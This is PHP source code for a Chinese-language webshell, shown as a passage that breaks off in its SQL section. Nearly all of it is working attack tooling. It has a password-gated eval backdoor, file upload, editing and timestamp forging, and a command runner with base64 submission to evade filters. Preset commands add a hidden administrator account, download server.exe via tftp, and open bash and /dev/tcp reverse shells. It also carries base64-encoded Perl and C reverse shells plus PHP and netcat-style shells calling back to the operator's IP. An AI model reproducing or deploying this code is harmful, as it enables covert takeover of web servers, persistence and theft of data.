<?php
header("Content-type:text/html;charset=utf8");
$password='yzddmr6';
$shellname='Hello By yzddmr6';
$myurl=null;
error_reporting(0);
ob_start();
define('myaddress',$_SERVER['SCRIPT_FILENAME']);
define('postpass',$password);
define('shellname',$shellname);
define('myurl',$myurl);
if(@get_magic_quotes_gpc()){
	foreach($_POST as $k => $v) $_POST[$k] = stripslashes($v);
	foreach($_GET as $k => $v) $_GET[$k] = stripslashes($v);
}
if(isset($_REQUEST[postpass])){
hmlogin(2);
@eval($_REQUEST[postpass]);
exit;}
if($_COOKIE['postpass'] != md5(postpass)){
	if($_POST['postpass']){
		if($_POST['postpass'] == postpass){
			setcookie('postpass',md5($_POST['postpass']));
			hmlogin();
		}else{
			echo '<CENTER>用户或密码错误</CENTER>';
		}
	}
	islogin($shellname,$myurl);
	exit;
}

if(isset($_GET['down'])) do_down($_GET['down']);
if(isset($_GET['pack'])){
	$dir = do_show($_GET['pack']);
	$zip = new eanver($dir);
	$out = $zip->out;
	do_download($out,$_SERVER['HTTP_HOST'].".tar.gz");
}
if(isset($_GET['unzip'])){
	css_main();
	start_unzip($_GET['unzip'],$_GET['unzip'],$_GET['todir']);
	exit;
}

define('root_dir',str_replace('\\','/',dirname(myaddress)).'/');
define('run_win',substr(PHP_OS, 0, 3) == "WIN");
define('my_shell',str_path(root_dir.$_SERVER['SCRIPT_NAME']));
$eanver = isset($_GET['eanver']) ? $_GET['eanver'] : "";
$doing = isset($_POST['doing']) ? $_POST['doing'] : "";
$path = isset($_GET['path']) ? $_GET['path'] : root_dir;
$name = isset($_POST['name']) ? $_POST['name'] : "";
$img = isset($_GET['img']) ? $_GET['img'] : "";
$p = isset($_GET['p']) ? $_GET['p'] : "";
$pp = urlencode(dirname($p));
if($img) css_img($img);
if($eanver == "phpinfo") die(phpinfo());
if($eanver == 'logout'){
	setcookie('postpass',null);
	die('<meta http-equiv="refresh" content="0;URL=?">');
}

$class = array(
"信息操作" => array("upfiles" => "上传文件","phpinfo" => "基本信息","info_f" => "系统信息","phpcode" => "执行PHP脚本"),
"提权工具" => array("sqlshell" => "执行SQL执行","mysql_exec" => "MYSQL操作","myexp" => "MYSQL提权","servu" => "Serv-U提权","cmd" => "执行命令","linux" => "反弹提权","downloader" => "文件下载","port" => "端口扫描"),
"批量操作" => array("guama" => "批量挂马清马","tihuan" => "批量替换内容","scanfile" => "批量搜索文件","scanphp" => "批量查找木马"),
"脚本插件" => array("getcode" => "在线代理")
);
$msg = array("0" => "保存成功","1" => "保存失败","2" => "上传成功","3" => "上传失败","4" => "修改成功","5" => "修改失败","6" => "删除成功","7" => "删除失败");
css_main();
switch($eanver){
	case "left":
	css_left();
		html_n("<dl><dt><a href=\"#\" onclick=\"showHide('items1');\" target=\"_self\">");
		html_img("title");html_n(" 本地硬盘</a></dt><dd id=\"items1\" style=\"display:block;\"><ul>");
    $ROOT_DIR = File_Mode();
    html_n("<li><a title='$ROOT_DIR' href='?eanver=main&path=$ROOT_DIR' target='main'>网站根目录</a></li>");
	html_n("<li><a href='?eanver=main' target='main'>本程序目录</a></li>");
	for ($i=66;$i<=90;$i++){$drive= chr($i).':';
    if (is_dir($drive."/")){$vol=File_Str("vol $drive");if(empty($vol))$vol=$drive;
    html_n("<li><a title='$drive' href='?eanver=main&path=$drive' target='main'>本地磁盘($drive)</a></li>");}}
	html_n("</ul></dd></dl>");
	$i = 2;
	foreach($class as $name => $array){
		html_n("<dl><dt><a href=\"#\" onclick=\"showHide('items$i');\" target=\"_self\">");
		html_img("title");html_n(" $name</a></dt><dd id=\"items$i\" style=\"display:block;\"><ul>");
		foreach($array as $url => $value){
			html_n("<li><a href=\"?eanver=$url\" target='main'>$value</a></li>");
		}
		html_n("</ul></dd></dl>");
		$i++;
	}
	html_n("<dl><dt><a href=\"#\" onclick=\"showHide('items$i');\" target=\"_self\">");
	html_img("title");html_n(" 其它操作</a></dt><dd id=\"items$i\" style=\"display:block;\"><ul>");
    html_n("<li><a title='安全退出' href='?eanver=logout' target=\"main\">安全退出</a></li>");
	html_n("</ul></dd></dl>");
	html_n("</div>");
	break;

	case "main":
	css_js("1");
	$dir = @dir($path);
	$REAL_DIR = File_Str(realpath($path));
	if(!empty($_POST['actall'])){echo '<div class="actall">'.File_Act($_POST['files'],$_POST['actall'],$_POST['inver'],$REAL_DIR).'</div>';}
	$NUM_D = $NUM_F = 0;
	if(!$_SERVER['SERVER_NAME']) $GETURL = ''; else $GETURL = 'http://'.$_SERVER['SERVER_NAME'].'/';
	$ROOT_DIR = File_Mode();
	html_n("<table width=\"100%\" border=0 bgcolor=\"#555555\"><tr><td><form method='GET'>地址:<input type='hidden' name='eanver' value='main'>");
	html_n("<input type='text' size='80' name='path' value='$path'> <input type='submit' value='转到'></form>");
	html_n("<br><form method='POST' enctype=\"multipart/form-data\" action='?eanver=editr&p=".urlencode($path)."'>");
	html_n("<input type=\"button\" value=\"新建文件\" onclick=\"rusurechk('newfile.php','?eanver=editr&p=".urlencode($path)."&refile=1&name=');\"> <input type=\"button\" value=\"新建目录\" onclick=\"rusurechk('newdir','?eanver=editr&p=".urlencode($path)."&redir=1&name=');\">");
	html_input("file","upfilet","","&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ");
	html_input("submit","uploadt","上传");
	if(!empty($_POST['newfile'])){
		if(isset($_POST['bin'])) $bin = $_POST['bin']; else $bin = "wb";
        $newfile=base64_decode($_POST['newfile']);
		if(strtolower($_POST['charset'])=='utf-8'){$txt=base64_decode($_POST['txt']);}else{$txt=$_POST['txt'];}
        if (substr(PHP_VERSION,0,1)>=5){if((strtolower($_POST['charset'])=='gb2312') or (strtolower($_POST['charset'])=='gbk')){$txt=iconv("UTF-8","gb2312//IGNORE" ,base64_decode($_POST['txt']));}else{$txt = array_iconv($txt);}}
		echo do_write($newfile,$bin,$txt) ? '<br>'.$newfile.' '.$msg[0] : '<br>'.$newfile.' '.$msg[1];
		@touch($newfile,@strtotime($_POST['time']));
	}
	html_n('</form></td></tr></table><form method="POST" name="fileall" id="fileall" action="?eanver=main&path='.$path.'"><table width="100%" border=0 bgcolor="#555555"><tr height="25"><td width="45%"><b>');
	html_a('?eanver=main&path='.uppath($path),'<b>上级目录</b>');
	html_n('</b></td><td align="center" width="10%"><b>操作</b></td><td align="center" width="5%"><b>文件属性</b></td>');
	html_n('<td align="center" width="8%"><b>('.get_current_user().')用户|组</b></td>');
	html_n('<td align="center" width="10%"><b>修改时间</b></td><td align="center" width="10%"><b>文件大小</b></td></tr>');
	while($dirs = @$dir->read()){
		if($dirs == '.' or $dirs == '..') continue;
		$dirpath = str_path("$path/$dirs");
		if(is_dir($dirpath)){
			$perm = substr(base_convert(fileperms($dirpath),10,8),-4);
			$filetime = @date('Y-m-d H:i:s',@filemtime($dirpath));
			$dirpath = urlencode($dirpath);
			html_n('<tr height="25"><td><input type="checkbox" name="files[]" value="'.$dirs.'">');
			html_img("dir");
			html_a('?eanver=main&path='.$dirpath,$dirs);
			html_n('</td><td align="center">');
			html_n("<a href=\"#\" onClick=\"rusurechk('$dirs','?eanver=rename&p=$dirpath&newname=');return false;\">改名</a>");
			html_n("<a href=\"#\" onClick=\"rusuredel('$dirs','?eanver=deltree&p=$dirpath');return false;\">删除</a> ");
			html_a('?pack='.$dirpath,'打包');
			html_n('</td><td align="center">');
			html_a('?eanver=perm&p='.$dirpath.'&chmod='.$perm,$perm);
            html_n('</td><td align="center">'.GetFileOwner("$path/$dirs").':'.GetFileGroup("$path/$dirs"));
			html_n('</td><td align="center">'.$filetime.'</td><td align="right">');
			html_n('</td></tr>');
			$NUM_D++;
		}
	}
	@$dir->rewind();
	while($files = @$dir->read()){
		if($files == '.' or $files == '..') continue;
		$filepath = str_path("$path/$files");
		if(!is_dir($filepath)){
			$fsize = @filesize($filepath);
			$fsize = File_Size($fsize);
			$perm  = substr(base_convert(fileperms($filepath),10,8),-4);
			$filetime = @date('Y-m-d H:i:s',@filemtime($filepath));
			$Fileurls = str_replace(File_Str($ROOT_DIR.'/'),$GETURL,$filepath);
			$todir=$ROOT_DIR.'/zipfile';
			$filepath = urlencode($filepath);
			$it=substr($filepath,-3);
			html_n('<tr height="25"><td><input type="checkbox" name="files[]" value="'.$files.'">');
			html_img(css_showimg($files));
			html_a($Fileurls,$files,'target="_blank"');
			html_n('</td><td align="center">');
            if(($it=='.gz') or ($it=='zip') or ($it=='tar') or ($it=='.7z'))
			   html_a('?unzip='.$filepath,'解压','title="解压'.$files.'" onClick="rusurechk(\''.$todir.'\',\'?unzip='.$filepath.'&todir=\');return false;"');
			else
               html_a('?eanver=editr&p='.$filepath,'编辑','title="编辑'.$files.'"');

			html_n("<a href=\"#\" onClick=\"rusurechk('$files','?eanver=rename&p=$filepath&newname=');return false;\">改名</a>");
			html_n("<a href=\"#\" onClick=\"rusuredel('$files','?eanver=del&p=$filepath');return false;\">删除</a> ");
			html_n("<a href=\"#\" onClick=\"rusurechk('".urldecode($filepath)."','?eanver=copy&p=$filepath&newcopy=');return false;\">复制</a>");
			html_a('?down='.$filepath,'下载','编辑','title="下载'.$files.'"');
			html_n('</td><td align="center">');
			html_a('?eanver=perm&p='.$filepath.'&chmod='.$perm,$perm);
            html_n('</td><td align="center">'.GetFileOwner("$path/$files").':'.GetFileGroup("$path/$files"));
			html_n('</td><td align="center">'.$filetime.'</td><td align="right">');
			html_a('?down='.$filepath,$fsize,'title="下载'.$files.'"');
			html_n('</td></tr>');
			$NUM_F++;
		}
	}
	@$dir->close();
	if(!$Filetime) $Filetime = gmdate('Y-m-d H:i:s',time() + 3600 * 8);
print<<<END
</table>
<div class="actall"> <input type="hidden" id="actall" name="actall" value="undefined">
<input type="hidden" id="inver" name="inver" value="undefined">
<input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form);">
<input type="button" value="复制" onclick="SubmitUrl('复制所选文件到路径: ','{$REAL_DIR}','a');return false;">
<input type="button" value="删除" onclick="Delok('所选文件','b');return false;">
<input type="button" value="属性" onclick="SubmitUrl('修改所选文件属性值为: ','0666','c');return false;">
<input type="button" value="时间" onclick="CheckDate('{$Filetime}','d');return false;">
<input type="button" value="打包" onclick="SubmitUrl('打包并下载所选文件下载名为: ','{$_SERVER['SERVER_NAME']}.tar.gz','e');return false;">
目录({$NUM_D}) / 文件({$NUM_F})</div>
</form>
END;
	break;

	case "editr":
print<<<END
<script>
END;
html_base();
print<<<END
	</script>
END;
	css_js("2");
	if(!empty($_POST['uploadt'])){
		echo @copy($_FILES['upfilet']['tmp_name'],str_path($p.'/'.$_FILES['upfilet']['name'])) ? html_a("?eanver=main",$_FILES['upfilet']['name'].' '.$msg[2]) : msg($msg[3]);
		die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path='.urlencode($p).'">');
	}
	if(!empty($_GET['redir'])){
        $name=$_GET['name'];
		$newdir = str_path($p.'/'.$name);
		@mkdir($newdir,0777) ? html_a("?eanver=main",$name.' '.$msg[0]) : msg($msg[1]);
		die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path='.urlencode($p).'">');
	}

	if(!empty($_GET['refile'])){
        $name=$_GET['name'];
		$jspath=urlencode($p.'/'.$name);
		$pp = urlencode($p);
		$p = str_path($p.'/'.$name);
		$FILE_CODE = "";
		$charset= 'GB2312';
        $FILE_TIME =date('Y-m-d H:i:s',time()+3600*8);
		if(@file_exists($p)) echo '发现目录下有"同名"文件<br>';
	}else{
		$jspath=urlencode($p);
		$FILE_TIME = date('Y-m-d H:i:s',filemtime($p));
        $FILE_CODE=@file_get_contents($p);
	     if (substr(PHP_VERSION,0,1)>=5){
            if(empty($_GET['charset'])){
			   if(TestUtf8($FILE_CODE)>1){$charset= 'UTF-8';$FILE_CODE = iconv("UTF-8","gb2312//IGNORE",$FILE_CODE);}else{$charset= 'GB2312';}
			  }else{
			   if($_GET['charset']=='GB2312'){$charset= 'GB2312';}else{$charset= $_GET['charset'];$FILE_CODE = iconv($_GET['charset'],"gb2312//IGNORE",$FILE_CODE);}
			  }
		  }
        $FILE_CODE = htmlspecialchars($FILE_CODE);
	}
print<<<END
<div class="actall">查找内容: <input name="searchs" type="text" value="{$dim}" style="width:500px;">
<input type="button" value="查找" onclick="search(searchs.value)"></div>
<form method='POST' id="editor"  action='?eanver=main&path={$pp}'>
<div class="actall">
<input type="text" name="newfile"  id="newfile" value="{$p}" style="width:750px;">指定编码：<input name="charset" id="charset" value="{$charset}" Type="text" style="width:80px;" onkeydown="if(event.keyCode==13)window.location='?eanver=editr&p={$jspath}&charset='+this.value;">
<input type="button" value="选择" onclick="window.location='?eanver=editr&p={$jspath}&charset='+this.form.charset.value;" style="width:50px;">
END;
html_select(array("GB2312" => "GB2312","UTF-8" => "UTF-8","BIG5" => "BIG5","EUC-KR" => "EUC-KR","EUC-JP" => "EUC-JP","SHIFT-JIS" => "SHIFT-JIS","WINDOWS-874" => "WINDOWS-874","ISO-8859-1" => "ISO-8859-1"),$charset,"onchange=\"window.location='?eanver=editr&p={$jspath}&charset='+options[selectedIndex].value;\"");
print<<<END
</div>
<div class="actall"><textarea name="txt" id="txt" style="width:100%;height:380px;">{$FILE_CODE}</textarea></div>
<div class="actall">文件修改时间 <input type="text" name="time" id="mtime" value="{$FILE_TIME}" style="width:150px;"> <input type="checkbox" name="bin" value="wb+" size="" checked>以二进制形式保存文件(建议使用)</div>
<div class="actall"><input type="button" value="保存" onclick="CheckDate();" style="width:80px;"> <input name='reset' type='reset' value='重置'>
<input type="button" value="返回" onclick="window.location='?eanver=main&path={$pp}';" style="width:80px;"></div>
</form>
END;
	break;

	case "rename":
	html_n("<tr><td>");
	$newname = urldecode($pp).'/'.urlencode($_GET['newname']);
	@rename($p,$newname) ? html_a("?eanver=main&path=$pp",urlencode($_GET['newname']).' '.$msg[4]) : msg($msg[5]);
	die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path='.$pp.'">');
	break;

	case "deltree":
	html_n("<tr><td>");
	do_deltree($p) ? html_a("?eanver=main&path=$pp",$p.' '.$msg[6]) : msg($msg[7]);
	die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path='.$pp.'">');
	break;

	case "del":
	html_n("<tr><td>");
	@unlink($p) ? html_a("?eanver=main&path=$pp",$p.' '.$msg[6]) : msg($msg[7]);
	die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path='.$pp.'">');
	break;

	case "copy":
	html_n("<tr><td>");
	$newpath = explode('/',$_GET['newcopy']);
	$pathr[0] = $newpath[0];
	for($i=1;$i < count($newpath);$i++){
		$pathr[] = urlencode($newpath[$i]);
	}
	$newcopy = implode('/',$pathr);
	@copy($p,$newcopy) ? html_a("?eanver=main&path=$pp",$newcopy.' '.$msg[4]) : msg($msg[5]);
	die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path='.$pp.'">');
	break;

	case "perm":
	html_n("<form method='POST'><tr><td>".$p.' 属性为: ');
	if(is_dir($p)){
		html_select(array("0777" => "0777","0755" => "0755","0555" => "0555"),$_GET['chmod']);
	}else{
		html_select(array("0666" => "0666","0644" => "0644","0444" => "0444"),$_GET['chmod']);
	}
	html_input("submit","save","修改");
	back();
	if($_POST['class']){
		switch($_POST['class']){
			case "0777": $change = @chmod($p,0777); break;
			case "0755": $change = @chmod($p,0755); break;
			case "0555": $change = @chmod($p,0555); break;
			case "0666": $change = @chmod($p,0666); break;
			case "0644": $change = @chmod($p,0644); break;
			case "0444": $change = @chmod($p,0444); break;
		}
		$change ? html_a("?eanver=main&path=$pp",$msg[4]) : msg($msg[5]);
		die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path='.$pp.'">');
	}
	html_n("</td></tr></form>");
	break;

    case "info_f":
	$dis_func = get_cfg_var("disable_functions");
	$upsize = get_cfg_var("file_uploads") ? get_cfg_var("upload_max_filesize") : "不允许上传";
	$adminmail = (isset($_SERVER['SERVER_ADMIN'])) ? "<a href=\"mailto:".$_SERVER['SERVER_ADMIN']."\">".$_SERVER['SERVER_ADMIN']."</a>" : "<a href=\"mailto:".get_cfg_var("sendmail_from")."\">".get_cfg_var("sendmail_from")."</a>";
	if($dis_func == ""){$dis_func = "No";}else{$dis_func = str_replace(" ","<br>",$dis_func);$dis_func = str_replace(",","<br>",$dis_func);}
	$phpinfo = (!eregi("phpinfo",$dis_func)) ? "Yes" : "No";
	$info = array(
		array("服务器时间",date("Y年m月d日 h:i:s",time())),
		array("服务器域名","<a href=\"http://".$_SERVER['SERVER_NAME']."\" target=\"_blank\">".$_SERVER['SERVER_NAME']."</a>"),
		array("服务器IP地址",gethostbyname($_SERVER['SERVER_NAME'])),
		array("服务器操作系统",PHP_OS),
		array("服务器操作系统文字编码",$_SERVER['HTTP_ACCEPT_LANGUAGE']),
		array("服务器解译引擎",$_SERVER['SERVER_SOFTWARE']),
		array("你的IP",$_SERVER["REMOTE_ADDR"]),
		array("Web服务端口",$_SERVER['SERVER_PORT']),
		array("PHP运行方式",strtoupper(php_sapi_name())),
		array("PHP版本",PHP_VERSION),
		array("运行于安全模式",Info_Cfg("safemode")),
		array("服务器管理员",$adminmail),
		array("本文件路径",myaddress),
		array("允许使用 URL 打开文件 allow_url_fopen",Info_Cfg("allow_url_fopen")),
		array("允许使用curl_exec",Info_Fun("curl_exec")),
		array("允许动态加载链接库 enable_dl",Info_Cfg("enable_dl")),
		array("显示错误信息 display_errors",Info_Cfg("display_errors")),
		array("自动定义全局变量 register_globals",Info_Cfg("register_globals")),
		array("magic_quotes_gpc",Info_Cfg("magic_quotes_gpc")),
		array("程序最多允许使用内存量 memory_limit",Info_Cfg("memory_limit")),
		array("POST最大字节数 post_max_size",Info_Cfg("post_max_size")),
		array("允许最大上传文件 upload_max_filesize",$upsize),
		array("程序最长运行时间 max_execution_time",Info_Cfg("max_execution_time")."秒"),
		array("被禁用的函数 disable_functions",$dis_func),
		array("phpinfo()",$phpinfo),
		array("目前还有空余空间diskfreespace",intval(diskfreespace(".") / (1024 * 1024)).'Mb'),
		array("图形处理 GD Library",Info_Fun("imageline")),
		array("IMAP电子邮件系统",Info_Fun("imap_close")),
		array("MySQL数据库",Info_Fun("mysql_close")),
		array("SyBase数据库",Info_Fun("sybase_close")),
		array("Oracle数据库",Info_Fun("ora_close")),
		array("Oracle 8 数据库",Info_Fun("OCILogOff")),
		array("PREL相容语法 PCRE",Info_Fun("preg_match")),
		array("PDF文档支持",Info_Fun("pdf_close")),
		array("Postgre SQL数据库",Info_Fun("pg_close")),
		array("SNMP网络管理协议",Info_Fun("snmpget")),
		array("压缩文件支持(Zlib)",Info_Fun("gzclose")),
		array("XML解析",Info_Fun("xml_set_object")),
		array("FTP",Info_Fun("ftp_login")),
		array("ODBC数据库连接",Info_Fun("odbc_close")),
		array("Session支持",Info_Fun("session_start")),
		array("Socket支持",Info_Fun("fsockopen")),
	);
	$shell = new COM("WScript.Shell") or die("This thing requires Windows Scripting Host");
	echo '<table width="100%" border="0">';
	for($i = 0;$i < count($info);$i++){echo '<tr><td width="40%">'.$info[$i][0].'</td><td>'.$info[$i][1].'</td></tr>'."\n";}
try{$registry_proxystring = $shell->RegRead("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp\PortNumber");
$Telnet = $shell->RegRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\TelnetServer\\1.0\\TelnetPort");
$PcAnywhere = $shell->RegRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\Symantec\\pcAnywhere\\CurrentVersion\\System\\TCPIPDataPort");
}catch(Exception $e){}
    echo '<tr><td width="40%">Terminal Service端口为</td><td>'.$registry_proxystring.'</td></tr>'."\n";
	echo '<tr><td width="40%">Telnet端口为</td><td>'.$Telnet.'</td></tr>'."\n";
	echo '<tr><td width="40%">PcAnywhere端口为</td><td>'.$PcAnywhere.'</td></tr>'."\n";
	echo '</table>';
	break;


    case "cmd":
	$res = '回显窗口';
	$cmd = 'whoami';
	if(!empty($_POST['cmd'])){$res = Exec_Run(base64_decode($_POST['cmd']));$cmd = htmlspecialchars(base64_decode($_POST['cmd']));}

print<<<END
<script language="javascript">
function sFull(i){
	Str = new Array(11);
	Str[0] = "dir";
	Str[1] = "net user mysql$ envl /add";
	Str[2] = "net localgroup administrators mysql$ /add";
	Str[3] = "netstat -ano";
	Str[4] = "ipconfig";
	Str[5] = "tasklist /svc";
	Str[6] = "tftp -i {$_SERVER["REMOTE_ADDR"]} get server.exe c:\\server.exe";
	Str[7] = "0<&123;exec 123<>/dev/tcp/{$_SERVER["REMOTE_ADDR"]}/12666; sh <&123 >&123 2>&123";
	Str[8] = "bash -i >& /dev/tcp/{$_SERVER["REMOTE_ADDR"]}/2366 0>&1";
	Str[9] = "netstat -tlnp";
	
	document.getElementById('cmd').value = Str[i];
	return true;
}
END;
html_base();
print<<<END
function SubmitUrl(){
			document.getElementById('cmd').value = base64encode(document.getElementById('cmd').value);
			document.getElementById('gform').submit();
}
</script>
<form method="POST" name="gform" id="gform" ><center><div class="actall">执行命令新增很多隐藏函数，外加使用BASE64加密提交，防止被拦（小细节，大成就）</div><div class="actall">
命令参数 <input type="text" name="cmd" id="cmd" value="{$cmd}" onkeydown="if(event.keyCode==13)SubmitUrl();" style="width:399px;">
<select onchange='return sFull(options[selectedIndex].value)'>
<option value="0" selected>--命令集合--</option>
<option value="1">添加管理员</option>
<option value="2">设为管理组</option>
<option value="3">查看端口</option>
<option value="4">查看地址</option>
<option value="5">查看进程</option>
<option value="6">FTP下载</option>
<option value="7">Linux反弹</option>
<option value="8">bash反弹</option>
<option value="9">Linux端口</option>
</select>
	<input type="button" value="执行" onclick="SubmitUrl();" style="width:80px;">
</div>
<div class="actall"><textarea name="show" style="width:660px;height:399px;">{$res}</textarea></div></center>
</form>
END;
	break;



case "linux":

	$yourip = $_COOKIE['yourip'] ? $_COOKIE['yourip'] : getenv('REMOTE_ADDR');
	$yourport = $_COOKIE['yourport'] ? $_COOKIE['yourport'] : '12388';

	$system=strtoupper(substr(PHP_OS, 0, 3));
print<<<END
<div class="actall">使用方法：<br>
			先在自己电脑运行"nc -vv -l 12388"<br>
			然后在此填写你电脑的IP,点连接！此反弹很全很实用！包括NC反弹！</div>
<form method="POST" name="kform" id="kform">
<div class="actall">你的地址 <input type="text" name="yourip" value="{$yourip}" style="width:400px"></div>
<div class="actall">连接端口 <input type="text" name="yourport" value="{$yourport}" style="width:400px"></div>
<div class="actall">执行方式 <select name="use" >
<option value="perl">Perl</option>
<option value="c">C</option>
<option value="php">PHP</option>
<option value="nc">NC</option>
</select></div>
<div class="actall"><input type="submit" value="开始连接" style="width:80px;"></div></form>
END;
	if((!empty($_POST['yourip'])) && (!empty($_POST['yourport'])))
	{
    setcookie('yourip',$backip);
	setcookie('yourport',$backport);

		echo '<div class="actall">';
		if($_POST['use'] == 'perl')
		{
			$back_connect_pl="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj".
			"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR".
			"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT".
			"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI".
			"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi".
			"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl".
			"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
			echo File_Write('/tmp/envl_bc',base64_decode($back_connect_pl),'wb') ? '创建/tmp/envl_bc成功<br>' : '创建/tmp/envl_bc失败<br>';
			$perlpath = Exec_Run('which perl');
			$perlpath = $perlpath ? chop($perlpath) : 'perl';
			@unlink('/tmp/envl_bc.c');
			echo Exec_Run($perlpath.' /tmp/envl_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -vv -l '.$_POST['yourport'] : '执行命令失败';
		}
		if($_POST['use'] == 'c')
		{
			$back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC".
			"BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb".
			"SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd".
			"KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ".
			"sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC".
			"Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D".
			"QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp".
			"Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";
			echo File_Write('/tmp/envl_bc.c',base64_decode($back_connect_c),'wb') ? '创建/tmp/envl_bc.c成功<br>' : '创建/tmp/envl_bc.c失败<br>';
			$res = Exec_Run('gcc -o /tmp/envl_bc /tmp/envl_bc.c');
			@unlink('/tmp/envl_bc.c');
			echo Exec_Run('/tmp/envl_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -vv -l '.$_POST['yourport'] : '执行命令失败';
		}
		if($_POST['use'] == 'php')
		{
		if(!extension_loaded('sockets'))
           {
	        if ($system == 'WIN') {
		        @dl('php_sockets.dll') or die("Can't load socket");
	        }else{
	    	    @dl('sockets.so') or die("Can't load socket");
	        }
           }
		   if($system=="WIN")
           {
         	$env=array('path' => 'c:\\windows\\system32');
            }else{
	        $env = array('PATH' => '/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin');
           }
           $descriptorspec = array(
         	0 => array("pipe","r"),
	        1 => array("pipe","w"),
	        2 => array("pipe","w"),
           );
		   $host = $_POST['yourip'];
       	   $port = $_POST['yourport'];
           $host=gethostbyname($host);
           $proto=getprotobyname("tcp");
           if(($sock=socket_create(AF_INET,SOCK_STREAM,$proto))<0){
             die("Socket创建失败");
           }
           if(($ret=socket_connect($sock,$host,$port))<0){
             die("连接失败");
           }else{
             $message="----------------------PHP反弹连接--------------------\n";
             socket_write($sock,$message,strlen($message));
             $cwd=str_replace('\\','/',dirname(__FILE__));
             while($cmd=socket_read($sock,65535,$proto)){
                if(trim(strtolower($cmd))=="exit"){
                   socket_write($sock,"Bye\n");
                   exit;
                }else{
                   $process = proc_open($cmd, $descriptorspec, $pipes, $cwd, $env);
                   if (is_resource($process)) {
	                fwrite($pipes[0], $cmd);
	                fclose($pipes[0]);
	                $msg=stream_get_contents($pipes[1]);
	                socket_write($sock,$msg,strlen($msg));
	                fclose($pipes[1]);
	                $msg=stream_get_contents($pipes[2]);
	                socket_write($sock,$msg,strlen($msg));
	                $return_value = proc_close($process);
                   }
                }
		   }
		  }
		}
		if($_POST['use'] == 'nc')
		{
	     echo '<div class="actall">';
		 $mip=$_POST['yourip'];
		 $bport=$_POST['yourport'];
		 $fp=fsockopen($mip , $bport , $errno, $errstr);
		 if (!$fp){
		     $result = "Error: could not open socket connection";
		    }else {
		 fputs ($fp ,"\n*********************************************\n
		              hacking url:http://www.google.com is ok!
			          \n*********************************************\n\n");
	     while(!feof($fp)){
         fputs ($fp," [r00t@yzddmr6:/root]# ");
         $result= fgets ($fp, 4096);
         $message=`$result`;
         fputs ($fp,"--> ".$message."\n");
                          }
         fclose ($fp);
		       }
         echo '</div>';
		}

		echo '<br>你可以尝试连接端口 (nc -vv -l '.$_POST['yourport'].') ';
	}
break;

	case "sqlshell":
	$MSG_BOX = '';
	$mhost = 'localhost'; $muser = 'root'; $mport = '3306'; $mpass = ''; $mdata = 'mysql'; $msql = 'select version();';
	if(isset($_POST['mhost']) && isset($_POST['muser']))
	{
		$mhost = $_POST['mhost']; $muser = $_POST['muser']; $mpass = $_POST['mpass']; $mdata = $_POST['mdata']; $mport = $_POST['mport'];
		if($conn = mysql_connect($mhost.':'.$mport,$muser,$mpass)) @mysql_select_db($mdata);
